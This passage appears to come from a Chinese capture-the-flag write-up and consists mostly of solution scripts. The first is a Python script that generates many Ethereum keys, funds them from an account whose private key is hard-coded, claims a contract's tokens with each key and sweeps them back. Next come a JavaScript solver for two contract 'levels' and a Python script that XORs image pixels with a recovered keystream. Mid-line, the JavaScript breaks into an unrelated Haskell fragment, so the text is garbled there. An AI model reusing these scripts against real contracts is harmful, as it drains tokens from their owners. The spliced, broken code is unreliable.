    runweb3 = Web3(my_ipc)
    main_account = "0x9bf312b5bbbbd496c99983ce9cb521d10fe7d7ec"
    private_key = "0xb040b3a864aa437ac02030e5cfa1199991214112b5dedbd11535c5298f16b31a"
    constract = "0x7caa18D765e5B4c3BF0831137923841FE3e7258a"
    drop_index = (2).to_bytes(32,"big")
    def run_account():
        salt = os.urandom(10).hex()
        x = 0
        while True:
            key =  salt + str(x)
            priv = sha3.keccak_256(key.encode()).digest()
            public = privtoaddr(priv).hex()
            if "7d7ec" in public:
                tmp_v = int(public, 16)
                addr = "0x" + sha3.keccak_256(tmp_v.to_bytes(32,"big")+drop_index).hexdigest()
                result = runweb3.eth.getStorageAt(constract, addr)
                if result[-1] == 0:
                    yield ("0x"+public, "0x"+priv.hex())
            x += 1
    def run(args):
        transaction_dict = {
            'from':Web3.toChecksumAddress(main_account),
            'to':'', # empty address for deploying a new contract
            'gasPrice':10000000000, 
            'gas':120000,
            'nonce': None,
            'value':3000000000000000,
            'data':""
        }
        transaction_dict2 = {
            'from': None,
            'to':Web3.toChecksumAddress(constract), 
            'gasPrice':10000000000, 
            'gas':102080,
            'nonce': 0,
            "value": 0,
            'data':"0xd25f82a0"
        }
        transaction_dict3 = {
            'from': None,
            'to':Web3.toChecksumAddress(constract), 
            'gasPrice':10000000000, 
            'gas':52080,
            'nonce': 1,
            "value": 0,
            'data':"0xa9059cbb0000000000000000000000009bf312b5bbbbd496c99983ce9cb521d10fe7d7ec00000000000000000000000000000000000000000000000000000000000003e8"
        }
        addr = args[0]
        priv = args[1]
        myNonce = runweb3.eth.getTransactionCount(Web3.toChecksumAddress(main_account))
        transaction_dict["nonce"] = myNonce
        transaction_dict["to"] = Web3.toChecksumAddress(addr)
        r = runweb3.eth.account.signTransaction(transaction_dict, private_key)
        try:
            runweb3.eth.sendRawTransaction(r.rawTransaction.hex())
        except Exception as e:
            print("error1", e)
            print(args)
            return
        while True:
            result = runweb3.eth.getBalance(Web3.toChecksumAddress(addr))
            if result > 0:
                break
            else:
                time.sleep(1)
        transaction_dict2["from"] = Web3.toChecksumAddress(addr)
        now_nouce = runweb3.eth.getTransactionCount(Web3.toChecksumAddress(addr))
        transaction_dict2["nonce"] = now_nouce
        r = runweb3.eth.account.signTransaction(transaction_dict2, priv)
        try:
            runweb3.eth.sendRawTransaction(r.rawTransaction.hex())
        except Exception as e:
            print("error2", e)
            print(args)
            return
        transaction_dict3["nonce"] = now_nouce + 1
        transaction_dict3["from"] = Web3.toChecksumAddress(addr)
        r = runweb3.eth.account.signTransaction(transaction_dict3, priv)
        try:
            runweb3.eth.sendRawTransaction(r.rawTransaction.hex())
        except Exception as e:
            print("error3", e)
            print(args)
            return
        print(args, "Done")
    def main():
        account_set = run_account()
        while True:
            params = next(account_set)
            t = threading.Thread(target=run, args=(params,))
            t.start()
    if __name__ == '__main__':
        main()
### easy little trick
`level1`的逻辑大概是:
    function level1(address target, uint hash, uint block) {
      require(hash == block.blockhash(block.blocknumber));
      require(block.blockhash(block) == 0);
      require((target.codesize) & 0xff == 0);
      passed1[target] == 1;
    }
众所周知`block.blockhash(block.blocknumber)`无法得到当前块的hash, 故为0. 然后`block`填0即可.
`level2`的逻辑大概是:
    function level2(address target, contract cont) {
      require((address(cont).codesize) & 0xff == 9);
      require(cont.getvalue() == block.difficulty);
      passed2[target] == 2;
    }
第二个条件很好过, 第一个条件需要`patch`一下合约代码, 将合约的长度增长到满足要求即可.
Script:
    const Web3 = require('web3');
    const Tx = require('ethereumjs-tx');
    const fs = require('fs');
    const WalletProvider = require("truffle-wallet-provider");
    const contract = "774Fea9014010a62017C739EAcB760D8E9B40B75";
    const mine = '9Fd6Bd7F75fB554A206dFa952cCa508d07e974C8';
    const check1 = '1af36a78';
    const check2 = 'e2e79a02';
    const flag = 'd4d96ac5';
    var patched = '608060405234801561001057600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610209806100606000396000f30060806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806341c0e1b51461004e57806369bd01c414610065575b005b34801561005a57600080fd5b50610063610090565b005b34801561007157600080fd5b5061007a610125565b6040518082815260200191505060405180910390f35b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156100eb57600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff5b6000449050905600a165627a7a72305820df99b71d2bf5b4a2dd8b67334c2e93e813a8dddf7ebac166db433f570210329a0029ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
    String.prototype.trim = function() {
        return String(this).replace(/^\s+|\s+$/g, '');
    };
    String.prototype.leftJustify = function( length, char ) {
        var fill = [];
        while ( fill.length + this.length  zero = 0
    *Main Crypto Helper Image> encryptoData $ replicate 30 zero
    [186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,207,200]
用这种方式获取密钥流.
script:
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    
    import struct, os, sys, itertools, IPython
    from PIL import Image
    def main():
        inp = Image.open("./input.png")
        outp = Image.open("./output.png")
        ip = inp.load()
        op = outp.load()
        w, h = inp.size
        assert (w, h) == outp.size
        rmatrix = []
        for hi in xrange(h):
            result = []
            for wid in xrange(w):
                assert ip[wid, hi][2] == op[wid, hi][2]
                result.append((ip[wid, hi][0] ^ op[wid, hi][0], ip[wid, hi][1] ^ op[wid, hi][1]))
            rmatrix.append(result)
        datachain = list(itertools.chain.from_iterable(rmatrix))
        data = []
        idx = 0
        while idx + 4 < len(datachain):
            byte = 0
            for i in xrange(4):
                byte = byte << 2
                byte += datachain[idx + i][1] + (datachain[idx + i][0] * 2)
            data.append(byte)
            idx += 4
        print len(data)
        keystream = [186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,198,205,206,151,164,193,208,200,210,204,190,202,146,193,202,205,55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97,186,153,154,192,204,149,206,161,158,215,154,132,203,190,156,201,195,200,203,146,161,196,213,205,215,201,187,207,151,196,207,200]
        r = ''
        for i in xrange(len(keystream)):
            r += chr(data[i] ^ keystream[i])
        print r
        IPython.embed()
        return
    main()